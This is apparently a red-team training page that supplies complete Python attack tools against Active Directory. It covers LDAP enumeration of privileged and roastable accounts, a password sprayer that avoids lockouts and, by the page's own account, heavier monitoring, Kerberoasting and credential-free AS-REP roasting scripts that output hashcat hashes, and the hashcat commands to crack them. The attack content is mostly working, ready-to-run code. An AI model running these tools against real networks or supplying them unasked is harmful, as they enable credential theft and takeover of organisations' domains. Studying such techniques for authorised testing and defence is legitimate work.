---
layout: training-page
title: "Python Active Directory Tools — Red Team Academy"
module: "Tool Development"
tags:
  - python
  - active-directory
  - ldap3
  - impacket
  - kerberoasting
  - password-spraying
page_key: "tooldev-python-ad-tools"
render_with_liquid: false
---

# Python Active Directory Tools

## Overview

Python has a richer ecosystem for attacking Active Directory than any other language. The **ldap3** library provides authenticated LDAP queries without requiring Windows RSAT; **impacket** implements nearly every Microsoft protocol (SMB, DCE/RPC, Kerberos, MS-DRSR) in pure Python; and the standard library's `socket` and `struct` modules can hand-craft raw Kerberos AS-REQ packets for password spraying without triggering a full Kerberos library load. This module builds each attack tool from scratch so the internals are clear.

Dependencies: `pip install ldap3 impacket`. All tools run from Linux or Windows.

## LDAP Domain Enumerator (ldap3)

ldap3 wraps the LDAP protocol in a clean Python API. After a simple `Connection` object is created with credentials (or anonymously if the DC allows it), LDAP search filters are used to enumerate users, groups, computers, and ACLs — replicating what BloodHound collects, in plain Python.

```
#!/usr/bin/env python3
"""
ldap_enum.py — Authenticated LDAP enumeration of an Active Directory domain.
Usage: python3 ldap_enum.py --dc 10.10.10.10 --domain corp.local -u jsmith -p 'Password1!'
Dumps: users, groups, computers, Kerberoastable accounts, unconstrained delegation hosts.
"""

import json
from argparse import ArgumentParser
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE

# ── LDAP search helper ────────────────────────────────────────────────────────
def ldap_search(conn: Connection, base_dn: str,
                search_filter: str, attributes: list[str]) -> list[dict]:
    """
    Execute an LDAP search and return results as a list of attribute dicts.
    conn.search() populates conn.entries; we convert to plain dicts for portability.
    """
    conn.search(
        search_base=base_dn,
        search_filter=search_filter,
        search_scope=SUBTREE,
        attributes=attributes,
        paged_size=1000        # request 1000 entries per page (LDAP paging)
    )
    results = []
    for entry in conn.entries:
        record = {}
        for attr in attributes:
            try:
                val = entry[attr].value
                # Convert bytes to hex string for JSON serialisation
                if isinstance(val, bytes):
                    val = val.hex()
                record[attr] = val
            except Exception:
                record[attr] = None
        results.append(record)
    return results

def domain_to_dn(domain: str) -> str:
    """Convert 'corp.local' to 'DC=corp,DC=local'."""
    return ",".join(f"DC={part}" for part in domain.split("."))

def run_enum(args) -> None:
    domain_dn = domain_to_dn(args.domain)
    server     = Server(args.dc, get_info=ALL)

    # NTLM bind — works with domain\user or UPN; safer than SIMPLE for modern DCs
    conn = Connection(
        server,
        user=f"{args.domain}\\{args.user}",
        password=args.password,
        authentication=NTLM,
        auto_bind=True
    )
    print(f"[+] Bound to {args.dc} as {args.user}")

    # ── Enumerate all users ──────────────────────────────────────────────────
    users = ldap_search(conn, domain_dn,
        search_filter="(&(objectClass=user)(objectCategory=person))",
        attributes=["sAMAccountName", "mail", "userAccountControl",
                    "pwdLastSet", "lastLogon", "memberOf", "adminCount",
                    "servicePrincipalName", "description"]
    )
    print(f"[*] Found {len(users)} user accounts")

    # ── Find Kerberoastable accounts (have an SPN set, not just computers) ──
    kerb = [u for u in users if u.get("servicePrincipalName")]
    print(f"[!] Kerberoastable users (SPN set): {len(kerb)}")
    for u in kerb:
        print(f"    {u['sAMAccountName']} — SPN: {u['servicePrincipalName']}")

    # ── Find AS-REP roastable (DONT_REQUIRE_PREAUTH flag = UAC bit 0x400000) ──
    # userAccountControl flags: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
    asrep = ldap_search(conn, domain_dn,
        search_filter="(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        attributes=["sAMAccountName", "userAccountControl"]
    )
    print(f"[!] AS-REP roastable (no pre-auth): {len(asrep)}")

    # ── Enumerate computers with unconstrained delegation ────────────────────
    # UAC bit 0x80000 (524288) = TRUSTED_FOR_DELEGATION
    uncon_deleg = ldap_search(conn, domain_dn,
        search_filter="(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
        attributes=["dNSHostName", "operatingSystem", "userAccountControl"]
    )
    print(f"[!] Unconstrained delegation hosts: {len(uncon_deleg)}")

    # ── Enumerate all groups and high-value group members ────────────────────
    priv_groups = ["Domain Admins", "Enterprise Admins", "Schema Admins",
                   "Backup Operators", "Account Operators", "Server Operators"]
    for grp in priv_groups:
        members = ldap_search(conn, domain_dn,
            search_filter=f"(&(objectClass=group)(cn={grp}))",
            attributes=["member"]
        )
        if members and members[0].get("member"):
            m = members[0]["member"]
            member_list = m if isinstance(m, list) else [m]
            print(f"[!] {grp} members ({len(member_list)}):")
            for dn in member_list:
                print(f"    {dn}")

    # ── Write full results to JSON ────────────────────────────────────────────
    output = {"users": users, "kerberoastable": kerb, "asrep_roastable": asrep,
               "unconstrained_delegation": uncon_deleg}
    with open("ldap_results.json", "w") as fh:
        json.dump(output, fh, indent=2, default=str)
    print("[+] Full results written to ldap_results.json")

    conn.unbind()

if __name__ == "__main__":
    ap = ArgumentParser()
    ap.add_argument("--dc",     required=True, help="Domain controller IP or hostname")
    ap.add_argument("--domain", required=True, help="Domain name (e.g. corp.local)")
    ap.add_argument("-u",       dest="user",     required=True)
    ap.add_argument("-p",       dest="password", required=True)
    run_enum(ap.parse_args())
```

## LDAP Password Sprayer

LDAP simple-bind password spraying is stealthier than SMB spraying because it generates LDAP event ID 2889 rather than the more-monitored 4625 (failed logon). The sprayer implements per-user lockout awareness by tracking consecutive failures and pausing to respect the domain's observation window, preventing account lockouts.

```
#!/usr/bin/env python3
"""
ldap_spray.py — Lockout-aware LDAP password sprayer.
Usage: python3 ldap_spray.py --dc 10.10.10.10 --domain corp.local
       --users users.txt --password 'Spring2026!'
       --lockout-threshold 3 --lockout-window 30

Lockout logic:
  - Tracks per-user attempt count.
  - If --lockout-threshold reached, sleeps --lockout-window minutes before next attempt.
  - Stops spraying a user after one valid credential found.
"""

import time
import socket
import ssl
import struct
import sys
from argparse import ArgumentParser
from dataclasses import dataclass, field

# Use ldap3 for clean LDAP binds; each bind attempt creates a fresh connection
from ldap3 import Server, Connection, SIMPLE, SYNC, core

@dataclass
class SprayState:
    """Track per-user attempt counts and found credentials."""
    attempt_counts: dict[str, int] = field(default_factory=dict)
    found: list[tuple[str, str]]   = field(default_factory=list)
    locked: set[str]               = field(default_factory=set)

def try_bind(dc: str, domain: str, username: str, password: str,
             timeout: float = 5.0) -> bool:
    """
    Attempt LDAP simple-bind as domain\\username.
    Returns True on successful authentication, False on failure.
    Raises exceptions for network errors (not auth failures).
    """
    server = Server(dc, connect_timeout=timeout)
    try:
        conn = Connection(
            server,
            user=f"{domain}\\{username}",
            password=password,
            authentication=SIMPLE,
            auto_bind=True,
            raise_exceptions=False   # don't raise on auth failure — check result
        )
        # result code 0 = success; 49 = invalidCredentials
        success = conn.result["result"] == 0
        conn.unbind()
        return success
    except core.exceptions.LDAPSocketOpenError:
        print(f"[!] Cannot reach DC {dc} — check connectivity", file=sys.stderr)
        raise
    except Exception:
        return False

def spray(args) -> None:
    users    = [u.strip() for u in open(args.users) if u.strip()]
    password = args.password
    state    = SprayState()

    print(f"[*] Spraying {len(users)} users with password: {password}")
    print(f"[*] Lockout threshold: {args.lockout_threshold} / window: {args.lockout_window}m")
    print(f"[*] Inter-attempt delay: {args.delay}s\n")

    for i, username in enumerate(users):
        # Skip users already found or locked out
        if username in state.locked:
            continue

        try:
            if try_bind(args.dc, args.domain, username, password):
                print(f"  [VALID] {username} : {password}")
                state.found.append((username, password))
            else:
                # Track failures; if threshold reached, pause to avoid lockout
                state.attempt_counts[username] = state.attempt_counts.get(username, 0) + 1
                if state.attempt_counts[username] >= args.lockout_threshold:
                    print(f"  [PAUSE] {username} near lockout — waiting {args.lockout_window}m")
                    time.sleep(args.lockout_window * 60)
                    state.attempt_counts[username] = 0   # reset counter after window
        except Exception:
            break  # network error — abort

        # Global inter-attempt delay to avoid rate-limit triggers
        time.sleep(args.delay)

        # Progress indicator every 50 users
        if (i + 1) % 50 == 0:
            print(f"[*] Progress: {i+1}/{len(users)} — {len(state.found)} found so far")

    print(f"\n[+] Spray complete. Valid credentials found: {len(state.found)}")
    for user, pw in state.found:
        print(f"  {args.domain}\\{user} : {pw}")

if __name__ == "__main__":
    ap = ArgumentParser(description="LDAP password sprayer")
    ap.add_argument("--dc",               required=True, help="DC IP")
    ap.add_argument("--domain",           required=True, help="Domain (e.g. corp.local)")
    ap.add_argument("--users",            required=True, help="Usernames file (one per line)")
    ap.add_argument("--password",         required=True, help="Password to spray")
    ap.add_argument("--delay",            type=float, default=1.0,  help="Seconds between attempts")
    ap.add_argument("--lockout-threshold",type=int,   default=3,    dest="lockout_threshold")
    ap.add_argument("--lockout-window",   type=int,   default=30,   dest="lockout_window",
                    help="Minutes to wait after reaching threshold")
    spray(ap.parse_args())
```

## Kerberoasting with Impacket

Impacket's `GetUserSPNs.py` implements the full Kerberoasting flow: enumerate SPNs via LDAP, request a TGS for each SPN, extract the encrypted portion, and output a hashcat-ready hash. The code below replicates this flow manually to show each step — from the Kerberos AS-REQ to the TGS-REP hash extraction.

```
#!/usr/bin/env python3
"""
kerberoast.py — Request TGS tickets for all SPN-bearing accounts and output hashcat hashes.
Usage: python3 kerberoast.py --dc 10.10.10.10 --domain corp.local -u jsmith -p 'Password1!'
Output: kerberoast_hashes.txt (hashcat -m 13100 format)

Dependencies: pip install impacket
"""

from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5 import constants
from impacket.ntlm import compute_lmhash, compute_nthash
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
from argparse import ArgumentParser
import datetime

def domain_to_dn(domain: str) -> str:
    return ",".join(f"DC={p}" for p in domain.split("."))

def get_spn_accounts(dc: str, domain: str, user: str, password: str) -> list[dict]:
    """Query LDAP for all user accounts with a ServicePrincipalName set."""
    conn = Connection(
        Server(dc, get_info=ALL),
        user=f"{domain}\\{user}",
        password=password,
        authentication=NTLM,
        auto_bind=True
    )
    base_dn = domain_to_dn(domain)
    conn.search(
        search_base=base_dn,
        search_filter="(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
        attributes=["sAMAccountName", "servicePrincipalName"]
    )
    spn_accounts = []
    for entry in conn.entries:
        spns = entry.servicePrincipalName.values
        spn_accounts.append({
            "account": entry.sAMAccountName.value,
            "spns":    spns if isinstance(spns, list) else [spns]
        })
    conn.unbind()
    return spn_accounts

def request_tgs_hash(dc: str, domain: str, user: str, password: str, spn: str) -> str | None:
    """
    Perform full Kerberos exchange:
    1. AS-REQ → get TGT (using username + password)
    2. TGS-REQ → request service ticket for the SPN
    3. Extract encrypted blob from TGS-REP → format as hashcat $krb5tgs$23$ hash
    """
    try:
        # Step 1: get a TGT using the attacker's credentials
        client_name = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        tgt, cipher, old_session_key, session_key = getKerberosTGT(
            clientName=client_name,
            password=password,
            domain=domain,
            lmhash=b"",
            nthash=b"",
            kdcHost=dc,
        )
        # Step 2: use the TGT to request a TGS for the target SPN
        server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        tgs, cipher, old_session_key, session_key = getKerberosTGS(
            serverName=server_name,
            domain=domain,
            kdcHost=dc,
            tgt=tgt,
            cipher=cipher,
            sessionKey=session_key,
        )
        # Step 3: extract the encryptedTicket from the KRB_TGS_REP ASN.1 structure
        # The encrypted part uses RC4-HMAC (etype 23) for crackable tickets
        # impacket's tgs object exposes the encrypted service ticket bytes:
        enc_part = tgs["ticket"]["enc-part"]["cipher"].asOctets()

        # Format for hashcat mode 13100 ($krb5tgs$23$*user*domain*spn*hash)
        enc_hex  = enc_part.hex()
        checksum = enc_hex[:32]          # first 16 bytes (32 hex chars) = checksum
        data     = enc_hex[32:]          # remainder = encrypted data

        hash_str = f"$krb5tgs$23$*{user}*{domain}*{spn}*{checksum}${data}"
        return hash_str

    except Exception as e:
        print(f"  [!] Failed for SPN {spn}: {e}")
        return None

def run(args) -> None:
    print(f"[*] Fetching SPNs from {args.dc}...")
    accounts = get_spn_accounts(args.dc, args.domain, args.user, args.password)
    print(f"[+] Found {len(accounts)} Kerberoastable accounts")

    hashes = []
    for acct in accounts:
        for spn in acct["spns"]:
            print(f"[*] Requesting TGS: {acct['account']} / {spn}")
            h = request_tgs_hash(args.dc, args.domain, args.user, args.password, spn)
            if h:
                hashes.append(h)
                print(f"  [+] Got hash for {spn}")

    with open("kerberoast_hashes.txt", "w") as fh:
        fh.write("\n".join(hashes) + "\n")
    print(f"\n[+] {len(hashes)} hashes written to kerberoast_hashes.txt")
    print("[*] Crack with: hashcat -m 13100 kerberoast_hashes.txt rockyou.txt")

if __name__ == "__main__":
    ap = ArgumentParser()
    ap.add_argument("--dc",     required=True)
    ap.add_argument("--domain", required=True)
    ap.add_argument("-u", dest="user",     required=True)
    ap.add_argument("-p", dest="password", required=True)
    run(ap.parse_args())
```

## AS-REP Roasting (No Pre-Authentication)

AS-REP roasting targets accounts with Kerberos pre-authentication disabled (`DONT_REQUIRE_PREAUTH` UAC flag). The attacker sends a raw AS-REQ without a timestamp authenticator; the KDC responds with an AS-REP containing the account's TGT encrypted with the user's key. No valid credentials are needed — just a username list.

```
#!/usr/bin/env python3
"""
asrep_roast.py — AS-REP roasting without credentials (no pre-auth required).
Usage: python3 asrep_roast.py --dc 10.10.10.10 --domain corp.local --users asrep_users.txt

--users: list of usernames whose DONT_REQUIRE_PREAUTH flag is set.
         (Find them with ldap_enum.py first, or query with dsquery)
Output: asrep_hashes.txt (hashcat -m 18200 format)
"""

from impacket.krb5 import constants, types
from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import datetime
import pathlib
from argparse import ArgumentParser

def build_asreq_no_preauth(username: str, domain: str) -> bytes:
    """
    Build a minimal AS-REQ for the given username without a PA-ENC-TIMESTAMP
    preauthenticator. This is all that's needed to elicit an AS-REP from DCs
    whose accounts have DONT_REQUIRE_PREAUTH set.
    """
    client = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    server = Principal(
        f"krbtgt/{domain}",
        type=constants.PrincipalNameType.NT_SRV_INST.value
    )
    now   = datetime.datetime.utcnow()
    req   = AS_REQ()

    req_body = req["req-body"]
    req_body["kdc-options"]     = constants.encodeFlags([0])    # no special flags
    req_body["cname"]           = seq_set(client, "name")
    req_body["realm"]           = domain.upper()
    req_body["sname"]           = seq_set(server, "name")
    req_body["till"]            = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"]           = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["nonce"]           = 0x12345678
    # Request RC4-HMAC (etype 23) — crackable; also request AES256 (18) for newer DCs
    seq_set_iter(req_body, "etype", [constants.EncryptionTypes.rc4_hmac.value,
                                     constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value])
    # No pA-data (no preauth) — this is what makes AS-REP roasting possible
    return encoder.encode(req)

def extract_hash(username: str, domain: str, asrep_raw: bytes) -> str:
    """
    Parse the AS-REP and extract the encrypted part for offline cracking.
    Formats as hashcat $krb5asrep$23$ (mode 18200).
    """
    asrep, _ = decoder.decode(asrep_raw, asn1Spec=AS_REP())
    enc_part  = asrep["enc-part"]
    etype     = int(enc_part["etype"])
    cipher    = bytes(enc_part["cipher"])
    enc_hex   = cipher.hex()
    # hashcat 18200: $krb5asrep$etype$user@DOMAIN:checksum$data
    return f"$krb5asrep${etype}${username}@{domain.upper()}:{enc_hex[:32]}${enc_hex[32:]}"

def roast(args) -> None:
    users  = pathlib.Path(args.users).read_text().splitlines()
    hashes = []

    for username in users:
        username = username.strip()
        if not username:
            continue
        try:
            req_data = build_asreq_no_preauth(username, args.domain)
            # sendReceive sends the request to the KDC and returns the raw response
            raw_reply = sendReceive(req_data, args.domain, args.dc)
            h = extract_hash(username, args.domain, raw_reply)
            hashes.append(h)
            print(f"[+] Got AS-REP hash for {username}")
        except Exception as e:
            print(f"[-] {username}: {e}")

    pathlib.Path("asrep_hashes.txt").write_text("\n".join(hashes) + "\n")
    print(f"\n[+] {len(hashes)} hashes in asrep_hashes.txt")
    print("[*] Crack with: hashcat -m 18200 asrep_hashes.txt rockyou.txt")

if __name__ == "__main__":
    ap = ArgumentParser()
    ap.add_argument("--dc",     required=True)
    ap.add_argument("--domain", required=True)
    ap.add_argument("--users",  required=True)
    roast(ap.parse_args())
```
